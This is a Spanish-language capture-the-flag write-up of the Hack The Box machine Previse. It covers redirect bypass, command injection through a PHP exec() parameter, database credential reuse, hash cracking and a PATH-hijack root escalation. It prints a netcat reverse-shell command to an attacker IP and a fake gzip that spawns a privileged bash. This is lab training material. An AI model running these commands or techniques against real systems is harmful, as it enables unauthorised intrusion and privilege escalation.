---
title: Previse (Hack The Box)
author: J0lm3d0
date: 2022-01-08 21:00:00 +0200
categories: [HackTheBox]
tags: [linux, web_app_unprotected, path_hijacking]
pin: false
---

En este documento se recogen los pasos a seguir para la resolución de la máquina Previse de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.

![Logo de la máquina](/assets/img/HTB/Previse/machine.png)

[Write-up en PDF realizado mediante LaTeX](/pdfs/Write_up_Previse.pdf)

## Enumeración de servicios y recopilación de información sensible

Para comenzar, realizo un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```
# nmap -p- --open -T5 -n -vv 10.10.11.104

Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.

```
# nmap -p 22,80 -sC -sV 10.10.11.104

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Al encontrarse abiertos los puertos 22 y 80, y no contar con ningunas credenciales para el servicio SSH, comienzo a enumerar el servidor web. Al acceder a la página principal, me redirige a la ruta "/login.php", en la cual vemos un panel de login:

![Panel login del servidor web](/assets/img/HTB/Previse/loginpage.png)

Reviso el código fuente de la página, por si hubiesen dejado algunas credenciales en algún comentario, pero no hay nada. Por tanto, procedo a buscar directorios y/o archivos mediante la herramienta `Gobuster`. Tras la búsqueda, se ven varias rutas que hacen una redirección a "login.php", por lo que parece que hay que conseguir acceso para ver esas rutas.

```
# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x php,txt,html -u http://10.10.11.104

/download.php         (Status: 302) [Size: 0] [--> login.php]
/header.php           (Status: 200) [Size: 980]              
/nav.php              (Status: 200) [Size: 1248]             
/footer.php           (Status: 200) [Size: 217]              
/login.php            (Status: 200) [Size: 2224]             
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/files.php            (Status: 302) [Size: 4914] [--> login.php]              
/index.php            (Status: 302) [Size: 2801] [--> login.php]              
/status.php           (Status: 302) [Size: 2968] [--> login.php]              
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]                 
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]              
/config.php           (Status: 200) [Size: 0]                                 
/logs.php             (Status: 302) [Size: 0] [--> login.php]                 
/server-status        (Status: 403) [Size: 277]
```

Pero, tras revisar de nuevo el resultado, me sorprende que algunas de estas rutas en las que devuelve un código 302 y se hace una redirección a "login.php", tienen un tamaño mayor que 0, lo que podría significar que, antes de hacer la redirección, cargue el contenido de la página. Por tanto, pruebo a capturar una petición a una de esas rutas mediante `BurpSuite`. Realizo una petición a "files.php" y, efectivamente, veo que la página me responde con un código 302, pero me muestra el código fuente de la página.

![Código de la página "files" del servidor web](/assets/img/HTB/Previse/filescode_burp.png)

Además, para las respuestas, *BurpSuite* cuenta con la opción "Render", que interpreta el código y permite visualizar la web como si se hiciese desde un navegador.

![Página "files" del servidor web](/assets/img/HTB/Previse/filespage_burp.png)

De esta forma, compruebo el contenido de las diferentes rutas y detecto que la ruta "accounts.php" contiene un formulario que permite registrar una cuenta en la plataforma.

![Página "accounts" del servidor web](/assets/img/HTB/Previse/accountspage.png)

Para acceder a este formulario burlando la redirección se puede sustituir el código "302 Found" por un "200 OK" al interceptar la respuesta del servidor mediante *BurpSuite* y enviar el paquete una vez modificado. De esta forma, la página carga directamente en mi navegador y puedo completar el formulario, registrando así un nuevo usuario.

![Respuesta del servidor web al acceder a la ruta "accounts"](/assets/img/HTB/Previse/accountsburp.png)

## Acceso a la máquina

Tras registrar una cuenta y conseguir acceso a la plataforma, accedo a la ruta "files.php" y descargo el archivo siteBackup.zip que había visto previamente. Al descomprimirlo, veo que se trata de una copia de los archivos que componen el servidor web.

```
# ls -l

.rw-r--r-- j0lm3d0 j0lm3d0  5.6 KB Sat Jun 12 07:04:45 2021  accounts.php
.rw-r--r-- j0lm3d0 j0lm3d0  208 B  Sat Jun 12 07:07:09 2021  config.php
.rw-r--r-- j0lm3d0 j0lm3d0  1.5 KB Wed Jun  9 08:57:57 2021  download.php
.rw-r--r-- j0lm3d0 j0lm3d0  1.2 KB Sat Jun 12 07:10:16 2021  file_logs.php
.rw-r--r-- j0lm3d0 j0lm3d0  6.0 KB Wed Jun  9 08:51:48 2021  files.php
.rw-r--r-- j0lm3d0 j0lm3d0  217 B  Thu Jun  3 06:00:53 2021  footer.php
.rw-r--r-- j0lm3d0 j0lm3d0 1012 B  Sat Jun  5 21:56:20 2021  header.php
.rw-r--r-- j0lm3d0 j0lm3d0  551 B  Sat Jun  5 22:00:14 2021  index.php
.rw-r--r-- j0lm3d0 j0lm3d0  2.9 KB Sat Jun 12 07:06:21 2021  login.php
.rw-r--r-- j0lm3d0 j0lm3d0  190 B  Tue Jun  8 12:42:56 2021  logout.php
.rw-r--r-- j0lm3d0 j0lm3d0  1.1 KB Wed Jun  9 08:58:41 2021  logs.php
.rw-r--r-- j0lm3d0 j0lm3d0  1.2 KB Sat Jun  5 15:31:05 2021  nav.php
.rw-r--r-- j0lm3d0 j0lm3d0  1.9 KB Wed Jun  9 08:40:24 2021  status.php
```

De estos archivos, comienzo visualizando el "config.php", ya que los archivos de configuración pueden contener credenciales en texto claro en el código y, en este caso, es así::

```php
# cat config.php

<?php
function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}
?>
```

Pero con estas credenciales no puedo acceder a nada, ya que el servicio de base de datos no está expuesto de forma externa, solo es accesible desde el propio servidor. Dándole otra vuelta a los archivos descargados, veo que el fichero "logs.php", es el encargado de sacar un log con los archivos que ha descargado cada usuario.

```php

# cat logs.php

<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```

Para obtener el log, utiliza la función *exec()* para ejecutar un script de Python, pasándole como argumento el parámetro "delim" capturado en la petición POST originada en la página "file_logs.php".

![Página "file_logs" del servidor web](/assets/img/HTB/Previse/filelogspage.png)

Al clicar en el botón de "Submit", veremos la siguiente petición a "logs.php", donde vemos la variable "delim" con el valor indicado previamente desde el navegador web..

![Petición a "logs.php"](/assets/img/HTB/Previse/filelogsrequest.png)

Al ser sustituido el valor de "delim" por un parámetro en la función *exec()* de PHP, que realiza una ejecución a nivel de sistema, podemos concatenar un comando para ver si se ejecuta.. En este caso, pruebo a lanzar una shell a mi máquina de atacante mediante `NetCat`.

![Petición modificada a "logs.php"](/assets/img/HTB/Previse/filelogsmodrequest.png)

![Accedo a la máquina como "www-data"](/assets/img/HTB/Previse/access.png)

Tras acceder, consulto la base de datos "previse" utilizando las credenciales que había obtenido anteriormente. En ella, encuentro 2 tablas: "accounts" y "files". En la tabla "accounts" encuentro las contraseñas hasheadas de mi usuario y de "m4lwhere", siendo este último un usuario del sistema operativo también.

```
www-data@previse:/var/www/html$ mysql -u root -pmySQL_p@ssw0rd\!:\) -D previse -e "SHOW TABLES;"

+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
www-data@previse:/var/www/html$ mysql -u root -pmySQL_p@ssw0rd\!:\) -D previse -e "SELECT * FROM accounts"
mysql: [Warning] Using a password on the command line interface can be insecure.
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | j0lm3d0  | $1$🧂llol$9V3HE09GdFQiHRXIQrRgQ0 | 2021-10-12 14:18:14 |
+----+----------+------------------------------------+---------------------+
```

Gracias a `HashCat`, logro crackear el hash MD5, obteniendo así la contraseña en texto claro.

```
# hashcat -a 0 -m 500 hash rockyou.txt

$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
Time.Started.....: Tue Oct 12 11:12:19 2021 (8 mins, 16 secs)
Time.Estimated...: Tue Oct 12 11:20:35 2021 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    15212 H/s (7.56ms) @ Accel:32 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 7413376/14344385 (51.68%)
Rejected.........: 0/7413376 (0.00%)
Restore.Point....: 7413248/14344385 (51.68%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidates.#1....: ilovecody98 -> ilovecloandlivey
```

Pruebo a acceder mediante el servicio SSH como el usuario "m4lwhere", proporcionando la contraseña recién obtenida, y consigo acceder y visualizar la primera flag.

```
m4lwhere@previse:~$ cat user.txt

17965ba0b03270cb341178f081b0202e
```

## Escalada de privilegios

Durante la enumeración del sistema para la escalada de privilegios, compruebo mediante el comando "sudo -l" si puede ejecutarse algún archivo con privilegios de otro usuario o sin proporcionar contraseña. En este caso, se puede ejecutar "access_backup.sh" con privilegios de root.

```
m4lwhere@previse:~$ sudo -l

User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

Tras revisar el script, veo que utiliza comandos sin emplear la ruta absoluta, por lo que este script sería vulnerable a un [Path Hijacking](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).

```
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh

#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

Para explotar la vulnerabilidad, creo un archivo con nombre "gzip" en la ruta "/tmp", cuya función será la de lanzar una bash, y agrego esta ruta al principio de la variable PATH.

```
m4lwhere@previse:~$ cat /tmp/gzip

/bin/bash -i -p

m4lwhere@previse:~$ export PATH=/tmp:$PATH
```

Con esto, una vez ejecute el script utilizando "sudo", obtendré una shell como root. Pero, como se ve en la siguiente imagen, no consigo ver la salida de los comandos que ejecuto, por lo que decido enviarme una shell a mi máquina de atacante y, de esta forma, ya veo la salida de los comandos y puedo visualizar la flag final.

```
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
root@previse:~# whoami
root@previse:~# nc -e /bin/bash 10.10.14.122 443



# nc -lvnp 443

listening on [any] 443 ...
connect to [10.10.14.122] from (UNKNOWN) [10.10.11.104] 36562
id

uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt

dc8bf89e4c22b9e1419461b1f62228b6

```
